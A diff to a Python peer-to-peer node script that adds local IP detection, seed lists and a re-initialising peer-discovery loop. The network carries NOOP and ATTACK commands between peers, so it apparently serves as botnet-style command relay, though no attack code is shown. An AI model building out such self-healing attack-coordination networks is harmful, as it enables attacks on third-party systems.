@@ -1,5 +1,6 @@
 import socket
 import time
+import datetime
 import threading
 import queue
 import sys
@@ -12,6 +13,21 @@ METHOD_REPORT        = 'REPORT'
 
 COMMAND_NOOP         = 'NOOP'
 COMMAND_ATTACK       = 'ATTACK'
+
+def get_ip():
+    ip = socket.gethostbyname(socket.gethostname())
+    if('127.' in ip):#then get the real local ip
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80)) #assuming no proxy
+            return s.getsockname()[0] #192.168.x.x
+    return ip
+
+INIT_SEEDS = [
+        (get_ip(), 1998),
+        (get_ip(), 1999),
+        (get_ip(), 2000),
+        ('192.168.0.21', 2000)
+    ]
 
 
 global_peer_list = []
@@ -166,11 +182,7 @@ def listen_thread(my_address, write_queue):
 
 def boot_server(host='', port=2000):
 
-    SEEDS = [
-        ('192.168.1.129', 1998),
-        ('192.168.1.129', 1999),
-        ('192.168.1.129', 2000)
-    ]
+    SEEDS = INIT_SEEDS
 
     listenthread_read_queue = queue.Queue()
 
@@ -185,6 +197,31 @@ def boot_server(host='', port=2000):
     global current_command
     current_command = COMMAND_NOOP
 
+    verify_seeds(SEEDS,global_peer_list,current_command,host, port)
+
+    while True:
+        for peer in global_peer_list:
+            is_alive = send_ping(peer)
+            if not is_alive:
+                global_peer_list.remove(peer)
+                print('Removing', peer, 'from list')
+
+        # Read new peers from queue
+        try:
+            while True:
+                new_peer = listenthread_read_queue.get_nowait()
+                s_print('[DISCOVERY] adding', new_peer , 'to peer list')
+                global_peer_list.append(new_peer)
+        except queue.Empty as e:
+            pass
+        print('[CURRENT_PEERS]', global_peer_list)
+        time.sleep(5)
+        if not global_peer_list:
+            time.sleep(5)
+            print("re-initialize")
+            verify_seeds(SEEDS,global_peer_list,current_command,host, port)
+
+def verify_seeds(SEEDS,global_peer_list,current_command,host, port):
     for peer in SEEDS:
         # Disable pinging to self
         if peer == (host, port): continue
@@ -205,23 +242,8 @@ def boot_server(host='', port=2000):
 
         current_command = last_command
 
-    while True:
-        for peer in global_peer_list:
-            is_alive = send_ping(peer)
-            if not is_alive:
-                global_peer_list.remove(peer)
-                print('Removing', peer, 'from list')
-
-        # Read new peers from queue
-        try:
-            while True:
-                new_peer = listenthread_read_queue.get_nowait()
-                s_print('[DISCOVERY] adding', new_peer , 'to peer list')
-                global_peer_list.append(new_peer)
-        except queue.Empty as e:
-            pass
-        print('[CURRENT_PEERS]', global_peer_list)
-        time.sleep(5)
-
 if __name__ == '__main__':
-    boot_server(port=int(sys.argv[1]))
+    port=int(sys.argv[1])
+    ip = get_ip()
+    print('Initialize hosname: ', socket.gethostname(),' at address:',ip,':',port,'on:',datetime.datetime.now())
+    boot_server(ip,port)
